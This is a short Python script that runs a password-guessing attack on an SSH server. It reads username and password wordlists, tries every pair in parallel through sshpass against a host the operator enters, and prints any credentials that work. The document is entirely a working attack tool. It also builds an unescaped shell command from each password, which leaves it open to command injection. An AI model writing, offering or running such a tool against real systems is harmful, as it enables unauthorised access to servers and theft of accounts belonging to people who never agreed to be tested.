import multiprocessing
import subprocess
from typing import List, Tuple

def ssh_login(args: Tuple[str, str, str, set]) -> Tuple[str, str]:
    username, password, hostname, cache = args
    if (username, password) in cache:
        return False
    cmd = f'sshpass -p "{password}" ssh -o ConnectTimeout=5 {username}@{hostname} exit'
    try:
        subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
        print(f"Valid username found: {username} Valid password found: {password}")
        cache.add((username, password))
        return (username, password)
    except subprocess.CalledProcessError:
        return False
    except subprocess.TimeoutExpired:
        return False

def main() -> None:
    hostname = input("Enter the IP address of the ssh server: ")
    username_file = input("Enter the path to the username file: ")
    password_file = input("Enter the path to the password file: ")

    with open(username_file, 'r') as f:
        usernames = f.read().splitlines()

    with open(password_file, 'r') as f:
        passwords = f.read().splitlines()

    cache = set()
    with multiprocessing.Pool() as pool:
        args = [(username, password, hostname, cache) for username in usernames for password in passwords]
        results = pool.map(ssh_login, args)

    for result in results:
        if result:
            print(f"Successful login: {result[0]}:{result[1]}")
            return

if __name__ == "__main__":
    main()